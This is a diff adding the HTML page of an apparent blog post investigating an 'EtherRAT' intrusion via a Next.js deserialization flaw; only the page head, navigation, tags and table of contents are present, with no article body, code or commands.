@@ -1,0 +1,2163 @@
+<!doctype html>
+<html
+  lang="en-us"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en-us">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  
+    <title>CDEF-EtherRAT &middot; bubka hacks stuff</title>
+    <meta name="title" content="CDEF-EtherRAT &middot; bubka hacks stuff">
+  
+
+  
+  
+    <meta name="description" content="An attacker breached Maromalix&#39;s public-facing web application by exploiting CVE-2025-55182 (Next.js Deserialization RCE). They deployed a multi-stage implant dubbed EtherRAT, which utilizes a blockchain-based C2 mechanism via Ethereum smart contracts to dynamically resolve infrastructure. The attacker exfiltrated sensitive data, established multiple persistence mechanisms, and ultimately patched the vulnerability to lock out other actors.">
+  
+  
+    <meta name="keywords" content="Malware Analysis,Network Analysis,CVE-2025-55182,EtherRAT,Wireshark,Nmap,Web Attack,Linux,PCAP,JavaScript,TLS Sniffer,AES,RAT,Blockchain,Ethereum,Smart Contract,">
+  
+  
+  
+  <link rel="canonical" href="http://localhost:1313/investigations/cdef-callmeonthechain---etherrat/">
+  
+
+  
+  
+    <meta name="author" content="Bubka">
+  
+  
+
+  
+  <meta property="og:url" content="http://localhost:1313/investigations/cdef-callmeonthechain---etherrat/">
+  <meta property="og:site_name" content="bubka hacks stuff">
+  <meta property="og:title" content="CDEF-EtherRAT">
+  <meta property="og:description" content="An attacker breached Maromalix’s public-facing web application by exploiting CVE-2025-55182 (Next.js Deserialization RCE). They deployed a multi-stage implant dubbed EtherRAT, which utilizes a blockchain-based C2 mechanism via Ethereum smart contracts to dynamically resolve infrastructure. The attacker exfiltrated sensitive data, established multiple persistence mechanisms, and ultimately patched the vulnerability to lock out other actors.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="investigations">
+    <meta property="article:published_time" content="2026-04-16T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-04-16T00:00:00+00:00">
+    <meta property="article:tag" content="Malware Analysis">
+    <meta property="article:tag" content="Network Analysis">
+    <meta property="article:tag" content="CVE-2025-55182">
+    <meta property="article:tag" content="EtherRAT">
+    <meta property="article:tag" content="Wireshark">
+    <meta property="article:tag" content="Nmap">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="CDEF-EtherRAT">
+  <meta name="twitter:description" content="An attacker breached Maromalix’s public-facing web application by exploiting CVE-2025-55182 (Next.js Deserialization RCE). They deployed a multi-stage implant dubbed EtherRAT, which utilizes a blockchain-based C2 mechanism via Ethereum smart contracts to dynamically resolve infrastructure. The attacker exfiltrated sensitive data, established multiple persistence mechanisms, and ultimately patched the vulnerability to lock out other actors.">
+
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+  
+    
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.8b262900e857162468ff79cfc7b91dec04f6d43db8662d651ee0e073f63e1ad52c434858add76ccfc953efdeea8de584f4a82b7cc2f780bc5d02eb873ac78374.css"
+    integrity="sha512-iyYpAOhXFiRo/3nPx7kd7AT21D24Zi1lHuDgc/Y&#43;GtUsQ0hYrddsz8lT797qjeWE9KgrfML3gLxdAuuHOseDdA==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
+    integrity="sha512-b0EXSzoFtoCCD&#43;CMrb&#43;l&#43;3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script>
+  
+  
+  
+  
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+  
+    
+  
+  
+    
+  
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.67624a357c928d29b9fe19ba01a1e32c05ad1329ca2a712bf10446df0c6872903d0c14b21f76896b57a5a0710940805416cee38851d9067db6555881188e35a5.js"
+      integrity="sha512-Z2JKNXySjSm5/hm6AaHjLAWtEynKKnEr8QRG3wxocpA9DBSyH3aJa1eloHEJQIBUFs7jiFHZBn22VViBGI41pQ=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+  
+  
+  
+  
+  <script
+    defer
+    type="text/javascript"
+    src="/js/mermaid.bundle.123b31b3c46015cee384d15cf0ef614f7ed885722a7e6f496f9b83d7b8400aef5dc2f3b9fc778649d5ba948bf957b3c67bbdf4de0033db316bbe394e2f7da794.js"
+    integrity="sha512-Ejsxs8RgFc7jhNFc8O9hT37YhXIqfm9Jb5uD17hACu9dwvO5/HeGSdW6lIv5V7PGe7303gAz2zFrvjlOL32nlA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "",
+    "name": "CDEF-EtherRAT",
+    "headline": "CDEF-EtherRAT",
+    
+    "inLanguage": "en-us",
+    "url" : "http://localhost:1313/investigations/cdef-callmeonthechain---etherrat/",
+    "author" : {
+      "@type": "Person",
+      "name": "Bubka"
+    },
+    "copyrightYear": "2026",
+    "dateCreated": "2026-04-16T00:00:00\u002b00:00",
+    "datePublished": "2026-04-16T00:00:00\u002b00:00",
+    
+    "dateModified": "2026-04-16T00:00:00\u002b00:00",
+    
+    "keywords": ["Malware Analysis","Network Analysis","CVE-2025-55182","EtherRAT","Wireshark","Nmap","Web Attack","Linux","PCAP","JavaScript","TLS Sniffer","AES","RAT","Blockchain","Ethereum","Smart Contract"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "2767"
+  }]
+  </script>
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+  
+
+
+
+
+
+
+  
+  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+        Skip to main content
+      </a>
+    </div>
+    
+    
+      <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 z-100">
+  <div
+    id="menu-blur"
+    class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl bg-neutral/25 dark:bg-neutral-800/25"></div>
+  <div class="relative m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32">
+    <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
+  
+  
+    <a href="/" class="text-base font-medium truncate min-w-0 shrink">
+      bubka hacks stuff
+    </a>
+  
+  <div class="flex items-center ms-auto">
+    <div class="hidden md:flex">
+      <nav class="flex items-center gap-x-5 h-12">
+  
+    
+      
+  
+    <a
+      href="/investigations/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="[investigations]"
+      title="">
+      
+      
+        <span class="text-base font-medium break-normal">
+          [investigations]
+        </span>
+      
+    </a>
+  
+
+    
+      
+  
+    <a
+      href="/blue_team/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="[alert analysis]"
+      title="">
+      
+      
+        <span class="text-base font-medium break-normal">
+          [alert analysis]
+        </span>
+      
+    </a>
+  
+
+    
+  
+
+  
+
+  
+
+  
+    <button
+      id="search-button"
+      aria-label="Search"
+      class="text-base bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <div class="flex items-center">
+      <button
+        id="appearance-switcher"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base bf-icon-color-hover">
+        <div class="flex items-center justify-center dark:hidden">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+        </div>
+      </button>
+    </div>
+  
+</nav>
+
+
+
+    </div>
+    <div class="flex md:hidden">
+      <div class="flex items-center h-14 gap-4">
+  
+    <button
+      id="search-button-mobile"
+      aria-label="Search"
+      class="flex items-center justify-center bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <button
+      id="appearance-switcher-mobile"
+      type="button"
+      aria-label="Dark mode switcher"
+      class="flex items-center justify-center text-neutral-900 hover:text-primary-600 dark:text-neutral-200 dark:hover:text-primary-400">
+      <div class="dark:hidden">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+      </div>
+      <div class="hidden dark:block">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+      </div>
+    </button>
+  
+
+  
+    <input type="checkbox" id="mobile-menu-toggle" autocomplete="off" class="hidden peer">
+    <label for="mobile-menu-toggle" class="flex items-center justify-center cursor-pointer bf-icon-color-hover">
+      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+    </label>
+
+    <div
+      role="dialog"
+      aria-modal="true"
+      style="scrollbar-gutter: stable;"
+      class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
+      bf-scrollbar">
+      <label
+        for="mobile-menu-toggle"
+        class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </label>
+      <nav class="mx-auto max-w-md space-y-6">
+        
+  
+    
+    <div class="px-2">
+      <a
+        href="/investigations/"
+        aria-label="[investigations]"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="" class="text-2xl font-bold tracking-tight">
+          [investigations]
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/blue_team/"
+        aria-label="[alert analysis]"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="" class="text-2xl font-bold tracking-tight">
+          [alert analysis]
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+
+        
+  
+
+        
+  
+
+      </nav>
+    </div>
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+  <script>
+    (function () {
+      var mainmenu = document.querySelector(".main-menu");
+      if (!mainmenu) return;
+
+      var path = window.location.pathname;
+      var links = mainmenu.querySelectorAll('a[href="' + path + '"]');
+
+      links.forEach(function (link) {
+        var targets = link.querySelectorAll("span");
+        targets.forEach(function (el) {
+          el.classList.add("active");
+        });
+      });
+    })();
+  </script>
+
+
+  </div>
+</div>
+
+
+<script
+  type="text/javascript"
+  src="/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js"
+  integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W&#43;5DcKnbOMMOI&#43;f7IvMGNsVvUfj&#43;ooJ13n6EqqcGEz2FKMVvHLGwWPQ=="
+  data-blur-id="menu-blur"></script>
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  <article>
+    
+    
+      
+      
+      
+      
+        
+
+
+
+
+
+
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+
+
+
+  
+  
+
+
+
+
+  
+
+
+
+
+
+      
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        CDEF-EtherRAT
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-04-16T00:00:00&#43;00:00">April 16, 2026</time>
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+          
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/malware-analysis/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Malware Analysis
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/network-analysis/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Network Analysis
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/cve-2025-55182/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    CVE-2025-55182
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/etherrat/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    EtherRAT
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/wireshark/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Wireshark
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/nmap/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Nmap
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/web-attack/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Web Attack
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/linux/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Linux
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/pcap/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    PCAP
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/javascript/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    JavaScript
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/tls-sniffer/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    TLS Sniffer
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/aes/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    AES
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/rat/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    RAT
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/blockchain/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Blockchain
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/ethereum/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Ethereum
+  </span>
+</span>
+
+              </a>
+            
+              <a class="relative mt-[0.5rem] me-2" href="/tags/smart-contract/">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Smart Contract
+  </span>
+</span>
+
+              </a>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+        <div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
+          <div class="toc ps-5 print:hidden lg:sticky lg:top-[140px]">
+            <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600 text-sm">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#tldr"><span class="hl">TL;DR</span></a></li>
+        <li><a href="#stage-0-initial-access"><span>Stage 0: Initial Access</span></a>
+          <ul>
+            <li><a href="#nmap-scan">Nmap Scan</a></li>
+            <li><a href="#exploitation">Exploitation</a></li>
+            <li><a href="#cve-2025-55182">CVE-2025-55182</a></li>
+          </ul>
+        </li>
+        <li><a href="#stage-1-shell-script-deployment"><span>Stage 1: Shell Script Deployment</span></a>
+          <ul>
+            <li><a href="#ssh-analysis">s.sh analysis</a></li>
+            <li><a href="#tls-keylogger">TLS Keylogger</a></li>
+          </ul>
+        </li>
+        <li><a href="#stage-2-javascript-dropper"><span>Stage 2: JavaScript Dropper</span></a></li>
+        <li><a href="#stage-3-the-main-implant"><span>Stage 3: The Main Implant</span></a>
+          <ul>
+            <li><a href="#blockchain-based-c2">Blockchain-Based C2</a></li>
+            <li><a href="#contract-overview--osint">Contract Overview &amp; OSINT</a></li>
+            <li><a href="#initialization-and-c2-resolution">Initialization and C2 Resolution</a></li>
+            <li><a href="#beacon-loop-and-abi-analysis">Beacon Loop and ABI Analysis</a></li>
+          </ul>
+        </li>
+        <li><a href="#post-exploitation"><span>Post-Exploitation</span></a>
+          <ul>
+            <li><a href="#stage-0-reconnaissance">Stage 0: Reconnaissance</a></li>
+            <li><a href="#stage-1-sensitive-file-theft">Stage 1: Sensitive File Theft</a></li>
+            <li><a href="#stage-2-deep-persistence">Stage 2: Deep Persistence</a></li>
+            <li><a href="#stage-3-ssh-backdoor">Stage 3: SSH Backdoor</a></li>
+            <li><a href="#stage-4-interactive-shell">Stage 4: Interactive Shell</a></li>
+            <li><a href="#covering-tracks">Covering Tracks</a></li>
+          </ul>
+        </li>
+        <li><a href="#iocs"><span class="hl">IOCs</span></a></li>
+        <li><a href="#attack-timeline"><span class="hl">Attack Timeline</span></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#tldr"><span class="hl">TL;DR</span></a></li>
+        <li><a href="#stage-0-initial-access"><span>Stage 0: Initial Access</span></a>
+          <ul>
+            <li><a href="#nmap-scan">Nmap Scan</a></li>
+            <li><a href="#exploitation">Exploitation</a></li>
+            <li><a href="#cve-2025-55182">CVE-2025-55182</a></li>
+          </ul>
+        </li>
+        <li><a href="#stage-1-shell-script-deployment"><span>Stage 1: Shell Script Deployment</span></a>
+          <ul>
+            <li><a href="#ssh-analysis">s.sh analysis</a></li>
+            <li><a href="#tls-keylogger">TLS Keylogger</a></li>
+          </ul>
+        </li>
+        <li><a href="#stage-2-javascript-dropper"><span>Stage 2: JavaScript Dropper</span></a></li>
+        <li><a href="#stage-3-the-main-implant"><span>Stage 3: The Main Implant</span></a>
+          <ul>
+            <li><a href="#blockchain-based-c2">Blockchain-Based C2</a></li>
+            <li><a href="#contract-overview--osint">Contract Overview &amp; OSINT</a></li>
+            <li><a href="#initialization-and-c2-resolution">Initialization and C2 Resolution</a></li>
+            <li><a href="#beacon-loop-and-abi-analysis">Beacon Loop and ABI Analysis</a></li>
+          </ul>
+        </li>
+        <li><a href="#post-exploitation"><span>Post-Exploitation</span></a>
+          <ul>
+            <li><a href="#stage-0-reconnaissance">Stage 0: Reconnaissance</a></li>
+            <li><a href="#stage-1-sensitive-file-theft">Stage 1: Sensitive File Theft</a></li>
+            <li><a href="#stage-2-deep-persistence">Stage 2: Deep Persistence</a></li>
